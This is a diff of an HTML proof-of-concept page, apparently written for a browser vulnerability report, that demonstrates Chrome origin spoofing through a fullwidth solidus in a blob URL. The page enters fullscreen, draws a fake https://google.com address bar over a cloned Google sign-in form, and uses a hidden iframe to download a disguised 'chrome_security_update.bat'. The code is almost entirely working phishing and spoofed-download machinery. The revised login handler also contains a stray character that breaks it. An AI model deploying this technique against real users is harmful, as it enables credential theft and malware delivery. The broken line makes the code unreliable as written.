@@ -3,375 +3,163 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Bypass Origin to Remove Source Display in Fullscreen via Blob URL Fullwidth Solidus</title>
+<title>PoC C - Top Fullscreen + Spoofed Blob Download (Fullwidth Solidus U+FF0F)</title>
 <style>
-  body {
-    margin: 0;
-    padding: 0;
-    background: #f8f9fa;
-    font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
-    color: #1a1a1a;
-    overflow: hidden;
-  }
-
-  .container {
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    text-align: center;
-    padding: 20px;
-  }
-
-  .title {
-    font-size: 1.4rem;
-    font-weight: 700;
-    line-height: 1.5;
-    margin-bottom: 20px;
-    max-width: 800px;
-    color: #202124;
-  }
-
-  .subtitle {
-    font-size: 0.85rem;
-    color: #d32f2f;
-    margin-top: 10px;
-    font-family: 'Courier New', Courier, monospace;
-    background: #fce8e6;
-    padding: 12px 16px;
-    border-radius: 6px;
-    border: 1px solid #fad2cf;
-    line-height: 1.5;
-  }
-
-  .trigger-btn {
-    padding: 16px 32px;
-    font-size: 1.1rem;
-    font-weight: 600;
-    background: #d32f2f;
-    color: white;
-    border: none;
-    border-radius: 8px;
-    cursor: pointer;
-    box-shadow: 0 4px 6px rgba(0,0,0,0.1);
-    transition: background 0.2s;
-    margin-top: 25px;
-  }
-
-  .trigger-btn:hover {
-    background: #b71c1c;
-  }
-
-  .fake-content {
-    display: none;
-    height: 100vh;
-    background: #ffffff;
-    overflow-x: hidden;
-  }
-  
-  .fake-content.active {
-    display: block;
-  }
-
-  /* --- FAKE BROWSER UI STYLES --- */
-  .fake-browser {
-    width: 100vw;
-    height: 100vh;
-    background: white;
-    position: fixed;
-    top: 0;
-    left: 0;
-    z-index: 9999;
-  }
-
-  .fake-address-bar {
-    background: #f1f3f4;
-    padding: 8px 16px;
-    display: flex;
-    align-items: center;
-    border-bottom: 1px solid #dadce0;
-  }
-
-  .fake-url-box {
-    background: white;
-    flex-grow: 1;
-    padding: 6px 12px;
-    border-radius: 16px;
-    font-size: 13px;
-    color: #202124;
-    display: flex;
-    align-items: center;
-    box-shadow: 0 1px 2px rgba(0,0,0,0.1);
-  }
-
-  .lock-icon {
-    width: 14px;
-    height: 14px;
-    margin-right: 8px;
-    fill: #5f6368;
-  }
-
-  .fake-content-area {
-    padding: 0;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: calc(100vh - 40px);
-    background: #f0f2f5;
-  }
-
-  /* --- GOOGLE LOGIN FORM STYLES --- */
-  .login-box {
-    background: white;
-    padding: 48px 40px;
-    border-radius: 8px;
-    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-    width: 450px;
-    max-width: 90%;
-    text-align: left;
-  }
-
-  .google-logo {
-    width: 75px;
-    margin-bottom: 10px;
-  }
-
-  .login-title {
-    font-size: 24px;
-    font-weight: 400;
-    color: #202124;
-    margin: 0 0 8px 0;
-  }
-
-  .login-subtitle {
-    color: #202124;
-    font-size: 16px;
-    margin-bottom: 30px;
-  }
-
-  .input-group {
-    margin-bottom: 8px;
-  }
-
-  .input-group label {
-    display: block;
-    font-size: 12px;
-    color: #202124;
-    margin-bottom: 6px;
-    font-weight: 500;
-  }
-
-  .login-input {
-    width: 100%;
-    padding: 13px 15px;
-    box-sizing: border-box;
-    border: 1px solid #dadce0;
-    border-radius: 4px;
-    font-size: 16px;
-  }
-
-  .login-input:focus {
-    outline: none;
-    border: 2px solid #1a73e8;
-    padding: 12px 14px;
-  }
-
-  .button-primary {
-    width: 100%;
-    padding: 12px 24px;
-    background: #0b57d0;
-    color: white;
-    border: none;
-    border-radius: 4px;
-    font-size: 14px;
-    font-weight: 500;
-    cursor: pointer;
-    margin-top: 24px;
-  }
-
-  .button-primary:hover {
-    background: #1a73e8;
-  }
+  body{margin:0;background:#f8f9fa;font-family:system-ui,-apple-system,'Segoe UI',Roboto,sans-serif;color:#1a1a1a;}
+  .container{display:flex;flex-direction:column;align-items:center;min-height:100vh;text-align:center;padding:20px;box-sizing:border-box;}
+  .title{font-size:1.25rem;font-weight:700;margin:10px 0;color:#202124;}
+  .subtitle{font-size:0.82rem;color:#d32f2f;font-family:'Courier New',monospace;background:#fce8e6;padding:10px 14px;border-radius:6px;border:1px solid #fad2cf;line-height:1.5;max-width:720px;}
+  .trigger-btn{padding:14px 26px;font-size:1rem;font-weight:600;background:#d32f2f;color:#fff;border:none;border-radius:8px;cursor:pointer;margin-top:18px;}
+  .trigger-btn:hover{background:#b71c1c;}
+  .notes{font-size:0.78rem;color:#444;background:#fff;border:1px solid #dadce0;border-radius:8px;padding:12px 16px;max-width:780px;margin-top:20px;text-align:left;line-height:1.6;}
+  .notes b{color:#b71c1c;}
+  #log{position:fixed;top:8px;right:8px;z-index:10000;width:360px;max-height:40vh;overflow:auto;background:rgba(20,20,20,0.88);color:#9be79b;font-family:'Courier New',monospace;font-size:11px;padding:8px 10px;border-radius:6px;text-align:left;white-space:pre-wrap;}
+  .fake-content{display:none;height:100vh;background:#fff;overflow:hidden;}
+  .fake-content.active{display:block;}
+  .fake-browser{width:100vw;height:100vh;background:#fff;position:fixed;top:0;left:0;z-index:9999;}
+  .fake-address-bar{background:#f1f3f4;padding:8px 16px;display:flex;align-items:center;border-bottom:1px solid #dadce0;}
+  .fake-url-box{background:#fff;flex-grow:1;padding:6px 12px;border-radius:16px;font-size:13px;color:#202124;display:flex;align-items:center;box-shadow:0 1px 2px rgba(0,0,0,0.1);}
+  .lock-icon{width:14px;height:14px;margin-right:8px;fill:#5f6368;}
+  .fake-content-area{display:flex;justify-content:center;align-items:center;height:calc(100vh - 40px);background:#f0f2f5;}
+  .login-box{background:#fff;padding:48px 40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:450px;max-width:90%;text-align:left;}
+  .google-logo{width:75px;margin-bottom:10px;}
+  .login-title{font-size:24px;font-weight:400;color:#202124;margin:0 0 8px 0;}
+  .login-subtitle{color:#202124;font-size:16px;margin-bottom:30px;}
+  .input-group{margin-bottom:8px;}
+  .input-group label{display:block;font-size:12px;color:#202124;margin-bottom:6px;font-weight:500;}
+  .login-input{width:100%;padding:13px 15px;box-sizing:border-box;border:1px solid #dadce0;border-radius:4px;font-size:16px;}
+  .button-primary{width:100%;padding:12px 24px;background:#0b57d0;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;margin-top:24px;}
+  .sim-watermark{position:fixed;bottom:6px;right:6px;z-index:10001;font-size:10px;color:#fff;background:rgba(211,47,47,0.85);padding:3px 8px;border-radius:4px;font-family:'Courier New',monospace;}
 </style>
 </head>
 <body>
 
-  <!-- Initial View: Displays PoC information and attack trigger button -->
   <div class="container" id="initial-view">
-    <div class="title">
-      Bypass Origin to Remove Source Display<br>
-      in Fullscreen via Blob URL Fullwidth Solidus
+    <div class="title">Variant C - Top-Level Fullscreen + Spoofed Blob Download<br>(Fullwidth Solidus U+FF0F in blob URL fragment)</div>
+    <div class="subtitle">Injection vector: <strong>blob:null/[uuid]#%EF%BC%8Fgoogle.com</strong><br>Surface yang diuji: source attribution di download shelf / chrome://downloads (+ teks toast fullscreen selama ~4 detik)</div>
+    <button class="trigger-btn" onclick="launchC()">Execute Payload &amp; Enter Fullscreen</button>
+    <div class="notes">
+      <b>Cara uji:</b><br>
+      1. Klik tombol: halaman masuk fullscreen (top-level) DAN hidden iframe sandboxed langsung trigger download .bat dengan href spoofed.<br>
+      2. Baca toast fullscreen Chrome SEBELUM auto-hide (~4 detik, by design), lalu tekan Esc.<br>
+      3. Setelah Esc: cek download shelf / chrome://downloads - baris sumber (from ...) adalah surface yang diuji vektor ini.<br>
+      4. Panel log kanan-atas merekam event: download-triggered (href spoofed), fullscreen enter/exit.<br>
+      5. Payload .bat harmless (hanya membuka notepad). Form login fake hanya alert lokal, tidak mengirim data.<br>
+      6. Catat chrome://version saat menguji; perilaku beda antar versi Chromium (fix issue 392818696 menetralkan sisi download UI).
     </div>
-    <div class="subtitle">
-      Injection Vector:<br>
-      <strong>blob:null/[uuid]#%EF%BC%8Fgoogle.com</strong><br><br>
-      Effect: Origin Spoofing & True Domain Disappearance
-    </div>
-    <button class="trigger-btn" onclick="initiateAttackSequence()">
-      Execute Payload & Enter Fullscreen
-    </button>
   </div>
 
-  <!-- Fake Browser View: Simulates Chrome browser with fake address bar and login form -->
   <div class="fake-content" id="fake-view">
     <div class="fake-browser">
-      <!-- Fake Address Bar -->
       <div class="fake-address-bar">
         <div class="fake-url-box">
-          <svg class="lock-icon" viewBox="0 0 24 24">
-            <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
-          </svg>
+          <svg class="lock-icon" viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
           <span>https://google.com</span>
         </div>
       </div>
-      
-      <!-- Fake Content Area with Google Login Form -->
-      <div class="fake-content-area" id="fake-content-area">
+      <div class="fake-content-area">
         <div class="login-box">
-          <!-- Google Logo SVG -->
           <svg class="google-logo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
             <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
             <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
             <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
             <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
           </svg>
-          
           <h2 class="login-title">Sign in</h2>
           <p class="login-subtitle">to continue to google.com</p>
-          
-          <div class="input-group">
-            <label for="email">Email or phone</label>
-            <input type="text" id="email" class="login-input" placeholder="Enter your email or phone" required>
-          </div>
-          
-          <div class="input-group">
-            <label for="password">Password</label>
-            <input type="password" id="password" class="login-input" placeholder="Enter your password" required>
-          </div>
-          
+          <div class="input-group"><label for="email">Email or phone</label><input type="text" id="email" class="login-input" placeholder="Enter your email or phone"></div>
+          <div class="input-group"><label for="password">Password</label><input type="password" id="password" class="login-input" placeholder="Enter your password"></div>
           <button class="button-primary" onclick="handleLoginClick()">Sign in</button>
         </div>
       </div>
     </div>
+    <div class="sim-watermark">SIMULATED BROWSER UI - PoC DEMO ONLY</div>
   </div>
 
-  <script>
-    /**
-     * Main attack sequence function
-     * Executes payload IMMEDIATELY, then switches to fullscreen and fake UI
-     */
-    function initiateAttackSequence() {
-      // STEP 1: Execute download payload FIRST (immediately, no delay)
-      executeDownloadPayload();
-      
-      // STEP 2: Request browser fullscreen mode
-      const elem = document.documentElement;
-      if (elem.requestFullscreen) {
-        elem.requestFullscreen().catch(err => {
-          console.log("Fullscreen request failed:", err);
-        });
-      } else if (elem.webkitRequestFullscreen) {
-        elem.webkitRequestFullscreen();
-      }
+  <div id="log"></div>
 
-      // STEP 3: IMMEDIATELY switch to fake browser UI (no delay)
-      document.getElementById('initial-view').style.display = 'none';
-      document.getElementById('fake-view').classList.add('active');
-    }
+<script>
+function makeDownloadDoc() {
+  var js = [
+    'var batLines = ["@echo off", "title Chrome Security Update", "echo harmless poc payload", "pause"];',
+    'var batContent = batLines.join(String.fromCharCode(13, 10));',
+    'var blob = new Blob([batContent], { type: "application/octet-stream" });',
+    'var realUrl = URL.createObjectURL(blob);',
+    'var uuid = realUrl.split("/").pop();',
+    'var spoofed = "blob:null/" + uuid + "#%EF%BC%8Fgoogle.com";',
+    'var a = document.createElement("a");',
+    'a.href = spoofed;',
+    'a.download = "chrome_security_update.bat";',
+    'document.body.appendChild(a);',
+    'a.click();',
+    'parent.postMessage({ t: "download-triggered", href: spoofed }, "*");',
+    'setTimeout(function () { URL.revokeObjectURL(realUrl); }, 20000);'
+  ].join("\n");
+  return "<!DOCTYPE html><html><head><meta charset=\"utf-8\"></head><body><scr" + "ipt>" + js + "</" + "script></body></html>";
+}
 
-    /**
-     * Download payload execution
-     * Creates hidden iframe with blob URL origin spoofing via fullwidth solidus injection
-     */
-    function executeDownloadPayload() {
-      const iframe = document.createElement('iframe');
-      iframe.sandbox = 'allow-scripts allow-downloads'; 
-      iframe.style.display = 'none'; 
-      document.body.appendChild(iframe);
+var fakeTimer = null;
 
-      // Payload: Creates .bat file with spoofed blob URL origin
-      const iframeHTML = `
-        <!DOCTYPE html>
-        <html><body><script>
-          const batLines = [
-            '@echo off',
-            'title Chrome Security Update',
-            'echo ========================================',
-            'echo   Chrome Security Update Installer',
-            'echo ========================================',
-            'echo.',
-            'echo Initializing update sequence...',
-            'timeout /t 2 >nul',
-            'echo Checking system compatibility...',
-            'timeout /t 1 >nul',
-            'echo Downloading security patches...',
-            'timeout /t 2 >nul',
-            'echo Applying updates...',
-            'timeout /t 2 >nul',
-            'echo.',
-            'echo Update completed successfully!',
-            'echo.',
-            'start "" "C:\\\\Windows\\\\System32\\\\notepad.exe"',
-            'pause'
-          ];
-          const batContent = batLines.join('\\r\\n');
+function log(msg) {
+  var el = document.getElementById("log");
+  var ts = new Date().toISOString().substr(11, 12);
+  el.textContent += "[" + ts + "] " + msg + "\n";
+  el.scrollTop = el.scrollHeight;
+}
 
-          // Create blob URL for the .bat file
-          const blob = new Blob([batContent], { type: "application/octet-stream" });
-          const realUrl = URL.createObjectURL(blob);
-          const uuid = realUrl.split("/").pop();
+function showFakeSoon(delay) {
+  if (fakeTimer) return;
+  fakeTimer = setTimeout(function () {
+    document.getElementById("initial-view").style.display = "none";
+    document.getElementById("fake-view").classList.add("active");
+  }, delay || 700);
+}
 
-          // INJECTION: Fullwidth solidus (U+FF0F) in blob URL fragment to spoof origin
-          const spoofedUrl = \`blob:null/\${uuid}#%EF%BC%8Fgoogle.com\`;
-          const filename = "chrome_security_update.bat";
+function resetViews() {
+  fakeTimer = null;
+  document.getElementById("fake-view").classList.remove("active");
+  document.getElementById("initial-view").style.display = "flex";
+}
 
-          // Trigger download with spoofed origin
-          const a = document.createElement("a");
-          a.href = spoofedUrl;
-          a.download = filename;
-          document.body.appendChild(a);
-          a.click();
+function launchC() {
+  log("launch C: top-level fullscreen + spoofed download iframe");
+  var iframe = document.createElement("iframe");
+  iframe.sandbox = "allow-scripts allow-downloads";
+  iframe.style.display = "none";
+  iframe.srcdoc = makeDownloadDoc();
+  document.body.appendChild(iframe);
+  var el = document.documentElement;
+  if (el.requestFullscreen) { el.requestFullscreen(); }
+  else if (el.webkitRequestFullscreen) { el.webkitRequestFullscreen(); }
+  showFakeSoon(700);
+}
 
-          // Cleanup: remove element and revoke blob URL
-          setTimeout(() => { a.remove(); URL.revokeObjectURL(realUrl); }, 1000);
-        <\/script></body></html>
-      `;
-      
-      iframe.srcdoc = iframeHTML;
-    }
+window.addEventListener("message", function (e) {
+  var d = e.data || {};
+  if (typeof d !== "object" || !d.t) return;
+  log("[iframe] " + d.t + (d.href ? " href=" + d.href : ""));
+});
 
-    /**
-     * Handle login form submission (demonstration only)
-     */
-    function handleLoginClick() {
-      const email = document.getElementById('email').value;
-      const password = document.getElementById('password').value;
-      
-      if (email && password) {
-        alert(`[PHISHING DEMONSTRATION]\n\nCredentials captured:\nEmail: ${email}\nPassword: ${password}\n\nUser believed they were on https://google.com due to fake address bar and fullscreen mode.`);
-        
-        // Exit fullscreen and reset
-        if (document.exitFullscreen) {
-          document.exitFullscreen();
-        }
-        document.getElementById('fake-view').classList.remove('active');
-        document.getElementById('initial-view').style.display = 'flex';
-      } else {
-        alert('Please enter email and password');
-      }
-    }
+document.addEventListener("fullscreenchange", function () {
+  if (!document.fullscreenElement) {
+    log("fullscreen EXITED - check download shelf / chrome://downloads source line now");
+    resetViews();
+  } else {
+    log("fullscreen ENTERED - watch the Chrome toast text NOW (auto-hides ~4s by design)");
+  }
+});
 
-    /**
-     * Fullscreen change event handler
-     */
-    document.addEventListener('fullscreenchange', () => {
-      if (!document.fullscreenElement) {
-        document.getElementById('fake-view').classList.remove('active');
-        document.getElementById('initial-view').style.display = 'flex';
-      }
-    });
-  </script>
-
+function handleLoginClick() {
+  var email = document.getElementById("email").value;a
+  var password = document.getElementById("password").value;
+  if (email && password) {
+    alert("[PHISHING DEMONSTRATION]\n\nCredentials captured (local only, not sent anywhere):\nEmail: " + email + "\nPassword: " + password + "\n\nUser believed they were on https://google.com due to fake address bar + fullscreen.");
+    if (document.exitFullscreen) { document.exitFullscreen(); }
+    resetViews();
+  } else {
+    alert("Please enter email and password");
+  }
+}
+</script>
 </body>
 </html>
